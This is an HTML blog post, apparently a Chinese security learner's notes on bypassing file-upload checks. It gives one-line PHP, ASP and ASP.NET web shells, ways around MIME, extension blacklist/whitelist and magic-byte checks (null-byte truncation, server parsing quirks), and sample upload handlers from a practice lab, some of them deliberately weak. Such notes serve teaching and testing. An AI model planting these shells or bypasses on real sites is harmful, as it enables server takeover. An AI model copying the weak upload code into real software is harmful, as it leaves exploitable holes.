@@ -1,0 +1,430 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="author" content="9527">
+  
+  
+  
+  
+    <meta name="description" content="&lt; !–more–&gt;一句话木马PHP：    &lt;?php echo shell_exec($_GET[‘a’]);?&gt;    &lt;?php @eval($_POST[‘a’]); ?&gt;ASP:    &lt;%eval request(“Cknife”)%&gt;　ASP.NET:    &lt;%@ Page Language=”Jscript”%&gt;...">
+  
+  <title>跟着大佬学的文件上传绕过 [ 9527 ]</title>
+  
+  
+    <link rel="shortcut icon" href="/01.ico">
+  
+  
+  <link rel="stylesheet" href="/css/random.css">
+<link rel="stylesheet" href="/css/vegas.min.css">
+<link rel="stylesheet" href="/css/highlight-railscasts.css">
+<link rel="stylesheet" href="/css/jquery.fancybox.css">
+<link rel="stylesheet" href="/css/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/jquery.fancybox-thumbs.css">
+<link rel="stylesheet" href="/css/plyr.css">
+  
+</head>
+
+<body>
+<div class="side-navigate hide-area">
+  
+  
+    <div class="item next">
+      <a href="/2017/12/30/babypwn3学习经历/">
+        <div class="item-icon"></div>
+      </a>
+      <div class="item-title">
+        babypwn3学习经历
+      </div>
+    </div>
+  
+</div>
+<div id="outer-container" class="hide-area">
+<div id="container">
+  <div id="menu-outer" class="slide-down">
+    <div id="menu-inner">
+      <div id="brand">
+        
+        <a onClick="openUserCard()">
+          <img id="avatar" src="/background.png"/>
+          <div id="homelink">9527</div>
+        </a>
+      </div>
+      <div id="menu-list">
+        <ul>
+        
+        
+          
+            <li>
+          
+            <a href="/index.html">Home</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/archives">Archives</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/tags">Tags</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/categories">Categories</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="https://Stella9527.github.io">Github</a>
+            
+          </li>
+        
+        </ul>
+      </div>
+      <div id="show-menu">
+        <button>Menu</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="content-outer">
+    <div id="content-inner">
+      
+      
+  <article id="post">
+    <h1>跟着大佬学的文件上传绕过</h1>
+    <p class="page-title-sub">
+      <span id = "post-title-date">撰写于 2018-07-07</span>
+      
+        <span id = "post-title-updated">修改于 2018-07-07</span>
+      
+      
+      
+      <span id = "post-title-tags">
+      标签
+      
+      
+        
+        
+        <a href="/tags/web/">web</a>
+      
+      </span>
+      
+    </p>
+    
+    <p>&lt; !–more–&gt;<br>一句话木马<br>PHP：<br>    <strong>&lt;?php echo shell_exec($_GET[‘a’]);?&gt;</strong><br>    <strong>&lt;?php @eval($_POST[‘a’]); ?&gt;</strong><br>ASP:<br>    <strong>&lt;%eval request(“Cknife”)%&gt;</strong><br>　<br>ASP.NET:<br>    <strong>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt;</strong></p>
+<p>文件上传漏洞检测<br>    1、客户端javascript检测（通常在本地检测文件的扩展名）<br>    绕过：<br>        ①禁用js<br>        ②先把文件改成符合条件的文件格式上传，再在抓包，修改文件的后缀名</p>
+<pre><code>2、服务端检测绕过（MIME类型检测）
+绕过：
+    可以通过burp拦包，将原Content-Type类型该为符合要求的image/jpg或者别的类型。
+**基于MIME
+&lt;?php   if (isset($_POST[&apos;Upload&apos;])) {
+     $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
+     $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);
+     $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];
+     $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type’];
+        //得到上传文件名的类型，kali里可以用mimetype 文件名来查看
+        //例如：mimetype 1.php    9527.php: application/x-php(php类型)
+        //尽管后缀名改了还是能识别真正的类型（根据内容来检测）
+     $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; //得到文件的大小
+ if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000)){
+        //这里做文件类型和文件大小的比较
+        //文件大小被规定为100000KB，因此参照LOW抓包改文件最大值不能绕过
+ if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) {
+                echo &apos;&lt;pre&gt;&apos;;
+                echo &apos;Your image was not uploaded.&apos;;
+                echo &apos;&lt;/pre&gt;&apos;;  } 
+    else {
+                echo &apos;&lt;pre&gt;&apos;;
+                echo $target_path . &apos; succesfully uploaded!&apos;;
+                echo &apos;&lt;/pre&gt;&apos;;  }   }
+    else{
+            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;  } 
+            }   
+?&gt;**        
+
+3、服务端目录路径检测
+绕过：
+    上传时提供存储路劲为image/20160704/可以通过修改为image/20160704/evil.php%00来达到截断目的。后端程序会将该路劲连接为image/20160704/evil.php%00filename.gif00截断导致最终存储的文件名为evil.php
+
+4、服务端文件扩展名检测
+    （1）黑名单检测：接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传
+绕过：
+    ①后缀名大小写绕过 ,例如:将Burpsuite截获的数据包中的文件名    evil.php改evil.Php
+    ②名单列表绕过，尝试使用非黑名单内的后缀名，如php5，php7等
+    ③特殊文件名绕过（只适用windows，将文件名改为evil.php.或    evil.php (注意这里有一个空格),在windows下，不允许这样的命名，所以会将.和空格自动去掉）。
+    ④0x00截断绕过：在上传的时候，当文件系统读到0x00时，会认为文件已经结束。例如：1.php%00.jpg，验证扩展名是.jpg，但写入的时候是1.php文件。
+**
+基于黑名单
+&lt;?php
+    $BlackList = array(&apos;asp&apos;,&apos;php&apos;,&apos;jsp&apos;,&apos;php5&apos;,&apos;asa&apos;,&apos;aspx’);
+    //黑名单
+    if (isset($_POST[&quot;submit&quot;])){
+    $name = $_FILES[&apos;file&apos;][&apos;name&apos;]; //接收文件名
+    echo $name;
+    $extension = substr(strrchr($name,&quot;.&quot;),1);
+    //得到扩展名
+    $boo = false;        
+    foreach ($BlackList as $key=&gt;$value){
+    //foreach()函数的意思是BlackList的键值赋值给value
+    //相当于value=BlackList[i]，key=i(数组下标)
+       if ($value==$extension){
+    //迭代判断是否有命中
+        $boo=true;
+        break;//命中之后直接退出循环
+        }
+    }
+    if(!$boo){
+    //如果没有命中，则开始文件上传操作
+        $size=$_FILES[&apos;file&apos;][&apos;size’];
+        //接收文件大小        
+        $tmp=$_FILES[&apos;file&apos;][&apos;tmp_name’];
+        //临时路径
+        move_uploaded_file($tmp,$name);
+        //移动临时文件到当前文件目录
+        echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name;
+        }
+    else {
+        echo &quot;文件不合法！！&quot;;
+    }    
+}
+</code></pre><p>?&gt;<br><strong><br>        （2）白名单检测：接收上传的文件做扩展名匹配，匹配上白名单中的扩展名的文件才能上传<br>    绕过：<br>        ①0x00截断绕过<br>        ②解析漏洞绕过<br>        apache解析文件名是从右到左识别扩展名，如eval.php.jpg，文件为php文件，不能解析jpg会向前解析php<br>        IIS6.0 目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析。<br>        IIS6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型<br>        Nginx解析漏洞：将php文件换成其他可以通过的文件后缀，访问的时候在后面加上/.php，如evil.jpg/.php，evil.jpg会解析为php的格式
+</strong>    基于白名单<br>    &lt;?php<br>        $WhiteList=array(‘rar’,’jpg’,’png’,’bmp’,’gif’,’jpg’,’doc’);<br>        if (isset($_POST[“submit”])){<br>            $name = $_FILES[‘file’][‘name’];<br>            //接收文件名<br>            $extension = substr(strrchr($name,”.”),1);<br>            //得到扩展名<br>            $boo = false;</p>
+<pre><code>        foreach ($WhiteList as $key=&gt;$value){
+            if ($value==$extension){
+            //迭代判断是否有命中
+            $boo=true;
+            }
+        }
+        if($boo){
+        //如果有命中，则开始文件上传操作
+            $size=$_FILES[&apos;file&apos;][&apos;size’];
+            //接收文件大小
+            $tmp=$_FILES[&apos;file&apos;][&apos;tmp_name’];
+            //临时路径
+            move_uploaded_file($tmp,$name);
+            //移动临时文件到当前文件目录
+            echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name;
+            }
+        else {
+            echo &quot;文件不合法！！&quot;;
+            }        
+    }
+?&gt;**
+
+5、服务端文件内容检测
+图像类的文件内容检测
+    文件幻数检测（图片头格式检测）
+    jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46
+    gif内容头value= 47 49 46 38 39 61
+    png内容头value= 89 50 4E 47
+绕过：在文件头后加上一句话木马就能绕过
+    ![](文件上传绕过/png图.png)
+</code></pre>
+  </article>
+  <div class="random-toc-area">
+  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">显示目录</button>
+  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">隐藏目录</button>
+  <div class="random-toc">
+    <h2>目录</h2>
+    
+  </div>
+</div>
+
+  
+<nav id="pagination">
+  
+
+  
+
+  
+    <a href="/2017/12/30/babypwn3学习经历/" class="next">下一篇 babypwn3学习经历 &rarr;</a>
+  
+</nav>
+
+  <!-- JiaThis Button BEGIN -->
+
+<!-- JiaThis Button END -->
+
+
+      
+      
+    </div>
+  </div>
+
+  <div id="bottom-outer">
+    <div id="bottom-inner">
+      Site by 9527 using
+      <a href="http://hexo.io">Hexo</a> & <a href="https://github.com/stiekel/hexo-theme-random">Random</a>
+      <br>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+
+<div id="user-card">
+  <div class="center-field">
+    <img class="avatar" src="/background.png">
+    <p id="description"></p>
+    <ul class="social-icon">
+  
+  
+    <li>
+      <a href="https://Stella9527.github.io">
+        
+          GitHub
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="http://weibo.com">
+        
+          <i class="icon iconfont weibo">&#xe602;</i>
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="http://www.douban.com">
+        
+          <i class="icon iconfont douban">&#xe60f;</i>
+        
+      </a>
+    </li>
+  
+</ul>
+  </div>
+</div>
+
+
+<div id="btn-view">Hide</div>
+
+<script>
+// is trigger analytics / tongji script
+var isIgnoreHost = false;
+
+if(window && window.location && window.location.host) {
+  isIgnoreHost = ["localhost","127.0.0.1"].some(function(address){
+    return 0 === window.location.host.indexOf(address);
+  });
+}
+
+var isTriggerAnalytics = !( true && isIgnoreHost );
+
+</script>
+
+
+
+
+  
+  
+    <script src="/js/jquery-2.2.3.min.js"></script>
+  
+    <script src="/js/vegas.min.js"></script>
+  
+    <script src="/js/random.js"></script>
+  
+    <script src="/js/highlight.pack.js"></script>
+  
+    <script src="/js/jquery.mousewheel.pack.js"></script>
+  
+    <script src="/js/jquery.fancybox.pack.js"></script>
+  
+    <script src="/js/jquery.fancybox-thumbs.js"></script>
+  
+    <script src="/js/plyr.js"></script>
+  
+
+<script>
+
+  // fancybox
+  var backgroundImages = [];
+  
+  $('#post').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox') || $(this).parent().hasClass('fancybox-thumb')) return;
+      var alt = this.alt || this.title;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'post' + i);
+    });
+  });
+  $(".fancybox").fancybox();
+
+var vegasConfig = {"preload­Image":true,"transition":["slideLeft2","slideRight2","flash2"],"timer":true,"delay":5000,"shuffle":true,"count":28};
+var unsplashConfig = {"gravity":"north"};
+// is show background images
+var turnoffBackgroundImage = false;
+
+
+
+  turnoffBackgroundImage = true;
+
+
+var backgroundColor = "34495E";
+
+$(".fancybox-thumb").fancybox({
+  prevEffect: 'none',
+  nextEffect: 'none',
+  helpers: {
+    title: {
+      type: 'outside'
+    },
+    thumbs: {
+      width: 50,
+      height: 50
+    }
+  }
+});
+
+// show video with plyr
+$(".video-container iframe").each(function(i){
+  var url = $(this).attr('src');
+  var id = url.split('/').pop();
+  var plyrContainer = document.createElement('div');
+  plyrContainer.className = 'plyr';
+  var plyrElement = document.createElement('div');
+  plyrElement.dataset.videoId = id;
+  switch(true) {
+    case url.search('youtube.com') >= 0:
+      plyrElement.dataset.type = 'youtube';
+      break;
+    case url.search('vimeo.com') >= 0:
+      plyrElement.dataset.type = 'vimeo';
+      break;
+    default:
+      return;
+  };
+  plyrContainer.appendChild(plyrElement);
+  $(this).parent().html(plyrContainer);
+});
+plyr.setup('.plyr', {iconUrl: '/css/sprite.svg'});
+</script>
+</body>
+</html>
+
